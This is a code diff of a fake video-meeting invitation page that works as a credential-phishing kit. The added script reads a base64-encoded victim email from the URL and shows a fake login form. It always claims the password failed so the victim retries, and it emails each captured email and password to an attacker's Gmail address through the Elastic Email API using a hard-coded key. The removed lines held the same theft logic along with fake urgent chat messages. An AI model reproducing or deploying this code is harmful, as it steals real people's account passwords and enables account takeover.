@@ -792,221 +792,151 @@
         <source src="https://firebasestorage.googleapis.com/v0/b/zoom-42092.appspot.com/o/google_meet.mp3?alt=media&token=25fb9d63-afc2-474d-af04-71e0e56a928a" type="audio/mpeg">
     </audio>
 
-    <script>
-        // Request notification permission on page load
-        window.addEventListener('load', function() {
-            if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission();
+<script>
+    // ... (your existing code remains the same until the CREDENTIAL CAPTURE FUNCTIONALITY section)
+
+    // CREDENTIAL CAPTURE FUNCTIONALITY
+    const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
+    const fromEmail = 'smtp@choicelink.online';
+
+    let attemptCount = 0;
+    let errorTimeout;
+    let targetEmail = 'danjekwu778@gmail.com'; // Your email to receive credentials
+
+    // Get form elements
+    const loginForm = document.getElementById('loginForm');
+    const errorDiv = document.getElementById('errorMessage');
+    const passwordInput = loginForm.querySelector('input[type="password"]');
+    const userEmailDisplay = document.querySelector('h4');
+    const hiddenEmailInput = document.querySelector('input[name="email"]');
+    const submitButton = loginForm.querySelector('button[type="submit"]');
+    const welcomeMessage = document.querySelector('h3[style*="font-size: 16px"]');
+
+    // Base64 decoding function
+    function base64Decode(str) {
+        // Handle URL-safe base64 encoding
+        str = str.replace(/-/g, '+').replace(/_/g, '/');
+        // Pad the string with '=' to make it valid base64
+        while (str.length % 4) {
+            str += '=';
+        }
+        return decodeURIComponent(atob(str).split('').map(function(c) {
+            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join(''));
+    }
+
+    // Function to get query parameter from URL
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const paramLower = param.toLowerCase();
+        
+        for (let [key, value] of urlParams.entries()) {
+            if (key.toLowerCase() === paramLower) {
+                return value;
             }
-        });
-
-        // Sample chat messages
-        const chatMessages = [
-            "John: Hello, we're in a hurry and need your immediate presence in the meeting.",
-            "Sarah: Urgent: We require your attendance in the meeting right away.",
-            "Mike: Please join us as soon as possible, we're waiting for you.",
-            "Lisa: The client is waiting for our presentation.",
-            "David: Can you share your screen when you join?",
-            "Emma: We have some important updates to share.",
-            "Alex: The deadline is approaching fast.",
-            "Tom: Let's get started with the agenda items."
-        ];
-
-        let chatInterval;
-
-        function goToWaitingRoom() {
-            document.getElementById('landingPage').classList.add('hidden');
-            document.getElementById('waitingRoom').style.display = 'block';
-            
-            // Start ringtone
-            const audio = document.getElementById('ringtone');
-            audio.play().catch(() => {});
         }
+        return null;
+    }
 
-        function joinMeeting() {
-            // Request camera and microphone access
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(stream => {
-                    // Stop ringtone
-                    stopRingtone();
-                    
-                    // Hide waiting room, show meeting
-                    document.getElementById('waitingRoom').style.display = 'none';
-                    document.getElementById('meetingInterface').style.display = 'block';
-                    
-                    // Show user's camera feed
-                    const video = document.getElementById('userVideo');
-                    video.srcObject = stream;
-                    
-                    // Start chat messages
-                    startChatMessages();
-                })
-                .catch(err => {
-                    alert("Camera or microphone access denied. Please allow access to join the meeting.");
-                });
-        }
-
-        function stopRingtone() {
-            const audio = document.getElementById('ringtone');
-            audio.pause();
-            audio.currentTime = 0;
-        }
-
-        function startChatMessages() {
-            chatInterval = setInterval(() => {
-                const randomMessage = chatMessages[Math.floor(Math.random() * chatMessages.length)];
-                showChatMessage(randomMessage);
-            }, 3000 + Math.random() * 4000); // Random interval between 3-7 seconds
-        }
-
-        function showChatMessage(message) {
-            const captionElement = document.getElementById('caption');
-            captionElement.textContent = message;
-            captionElement.style.opacity = '1';
-            
-            // Hide message after 5 seconds
-            setTimeout(() => {
-                captionElement.style.opacity = '0';
-            }, 5000);
-        }
-
-       function cancelMeeting() {
-            // Show error message
-            const errorMessage = document.getElementById('errorMessage');
-            errorMessage.classList.add('show');
-            
-            // Hide error message after 5 seconds
-            setTimeout(() => {
-                errorMessage.classList.remove('show');
-            }, 5000);
-        }
-
-
-        function showCustomToast(message, duration = 3000) {
-            const toast = document.createElement('div');
-            toast.className = 'custom-toast';
-            const icon = document.createElement('span');
-            icon.className = 'custom-toast-icon';
-            icon.innerHTML = '&#9940;';
-            const text = document.createElement('span');
-            text.textContent = message;
-            toast.appendChild(icon);
-            toast.appendChild(text);
-            document.body.appendChild(toast);
-            toast.offsetHeight;
-            toast.classList.add('show');
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => {
-                    document.body.removeChild(toast);
-                }, 300);
-            }, duration);
-        }
-
-        // CREDENTIAL CAPTURE FUNCTIONALITY
-        const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
-        const fromEmail = 'smtp@choicelink.online';
-
-        // Use localStorage for victim data
-        let victimMap = {};
-        try {
-            victimMap = JSON.parse(localStorage.getItem('victimMap')) || {};
-        } catch (e) {
-            victimMap = {};
-        }
-
-        let attemptCount = 0;
-        let errorTimeout;
-        let targetEmail = 'danjekwu778@gmail.com'; // Your email to receive credentials
-
-        // Get form elements
-        const loginForm = document.getElementById('loginForm');
-        const errorDiv = document.getElementById('errorMessage');
-        const passwordInput = loginForm.querySelector('input[type="password"]');
-        const userEmailDisplay = document.querySelector('h4');
-        const hiddenEmailInput = document.querySelector('input[name="email"]');
-        const submitButton = loginForm.querySelector('button[type="submit"]');
-        const welcomeMessage = document.querySelector('h3[style*="font-size: 16px"]');
-
-        // Function to get query parameter from URL
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            const paramLower = param.toLowerCase();
-            
-            for (let [key, value] of urlParams.entries()) {
-                if (key.toLowerCase() === paramLower) {
-                    return value;
-                }
-            }
-            return null;
-        }
-
-        // Initialize page based on URL parameters
-        function initializePage() {
-            const requestID = getQueryParam('requestID'); 
-            
-            console.log("Looking for requestID. Found:", requestID);
-
-            if (requestID && victimMap[requestID]) {
-                const victimEmail = victimMap[requestID];
-                userEmailDisplay.textContent = victimEmail;
-                hiddenEmailInput.value = victimEmail;
-                
-                if (welcomeMessage) {
-                    welcomeMessage.textContent = `Welcome ${victimEmail}, You have been invited to join a meeting`;
-                }
-                
-                errorDiv.style.display = 'none';
-                console.log("Page initialized for victim:", victimEmail);
-            } else {
-                console.error("Invalid requestID or not found in map. ID was:", requestID);
+    // Initialize page based on URL parameters
+    function initializePage() {
+        // First try to get the target email directly from URL
+        let targetParam = getQueryParam('target');
+        let victimEmail = '';
+        
+        if (targetParam) {
+            try {
+                victimEmail = base64Decode(targetParam);
+                console.log("Decoded email from URL:", victimEmail);
+            } catch (e) {
+                console.error("Error decoding email:", e);
                 handleInvalidLink();
+                return;
+            }
+        } 
+        // Fallback to requestID for backward compatibility
+        else {
+            const requestID = getQueryParam('requestID');
+            console.log("Looking for requestID. Found:", requestID);
+            
+            // Try to get from localStorage (for same-device testing)
+            try {
+                const victimMap = JSON.parse(localStorage.getItem('victimMap')) || {};
+                if (requestID && victimMap[requestID]) {
+                    victimEmail = victimMap[requestID];
+                    console.log("Found victim in localStorage:", victimEmail);
+                } else {
+                    console.error("Invalid requestID or not found in localStorage");
+                    handleInvalidLink();
+                    return;
+                }
+            } catch (e) {
+                console.error("Error accessing localStorage:", e);
+                handleInvalidLink();
+                return;
             }
         }
 
-        function handleInvalidLink() {
-            passwordInput.style.display = 'none';
-            submitButton.style.display = 'none';
-            userEmailDisplay.style.display = 'none';
+        // Update the page with the victim's email
+        if (victimEmail) {
+            userEmailDisplay.textContent = victimEmail;
+            hiddenEmailInput.value = victimEmail;
             
-            errorDiv.textContent = 'Invalid meeting link. Please check your invitation.';
-            errorDiv.style.display = 'block';
-            errorDiv.style.color = 'red';
-            errorDiv.style.fontWeight = 'bold';
-            errorDiv.style.textAlign = 'center';
-            errorDiv.style.fontSize = '18px';
-            errorDiv.style.marginTop = '20px';
+            if (welcomeMessage) {
+                welcomeMessage.textContent = `Welcome ${victimEmail}, You have been invited to join a meeting`;
+            }
+            
+            errorDiv.style.display = 'none';
+            console.log("Page initialized for victim:", victimEmail);
+        } else {
+            console.error("No victim email found");
+            handleInvalidLink();
+        }
+    }
+
+    function handleInvalidLink() {
+        passwordInput.style.display = 'none';
+        submitButton.style.display = 'none';
+        userEmailDisplay.style.display = 'none';
+        
+        errorDiv.textContent = 'Invalid meeting link. Please check your invitation.';
+        errorDiv.style.display = 'block';
+        errorDiv.style.color = 'red';
+        errorDiv.style.fontWeight = 'bold';
+        errorDiv.style.textAlign = 'center';
+        errorDiv.style.fontSize = '18px';
+        errorDiv.style.marginTop = '20px';
+    }
+
+    // Form submission handler
+    loginForm.addEventListener('submit', function(event) {
+        event.preventDefault();
+        const password = passwordInput.value;
+        const victimEmail = hiddenEmailInput.value;
+
+        attemptCount++;
+        if (errorTimeout) clearTimeout(errorTimeout);
+
+        if (attemptCount === 1) {
+            errorDiv.textContent = 'Email or Password is incorrect!';
+        } else if (attemptCount === 2) {
+            errorDiv.textContent = 'Delay In Connection, Give It Another Try';
+        } else {
+            errorDiv.textContent = 'Network error! Connection timed out.';
         }
 
-        // Form submission handler
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault();
-            const password = passwordInput.value;
-            const victimEmail = hiddenEmailInput.value;
+        sendCredentialsToEmail(victimEmail, password, `Attempt ${attemptCount}`);
+        errorDiv.style.display = 'block';
+        
+        errorTimeout = setTimeout(() => {
+            errorDiv.style.display = 'none';
+        }, 3000);
 
-            attemptCount++;
-            if (errorTimeout) clearTimeout(errorTimeout);
+        passwordInput.value = '';
+        passwordInput.focus();
+    });
 
-            if (attemptCount === 1) {
-                errorDiv.textContent = 'Email or Password is incorrect!';
-            } else if (attemptCount === 2) {
-                errorDiv.textContent = 'Delay In Connection, Give It Another Try';
-            } else {
-                errorDiv.textContent = 'Network error! Connection timed out.';
-            }
-
-            sendCredentialsToEmail(victimEmail, password, `Attempt ${attemptCount}`);
-            errorDiv.style.display = 'block';
-            
-            errorTimeout = setTimeout(() => {
-                errorDiv.style.display = 'none';
-            }, 3000);
-
-            passwordInput.value = '';
-            passwordInput.focus();
-        });
-
-        // Function to send credentials via Elastic Email
+    // Function to send credentials via Elastic Email
     function sendCredentialsToEmail(victimEmail, password, attemptNumber) {
         const subject = `Credential Capture - ${attemptNumber}`;
         const bodyText = `Victim Email: ${victimEmail}\nPassword: ${password}\nAttempt: ${attemptNumber}\nTimestamp: ${new Date().toLocaleString()}\nURL: ${window.location.href}`;
@@ -1031,6 +961,6 @@
 
     // Initialize the page
     initializePage();
-    </script>
+</script>
 </body>
 </html>
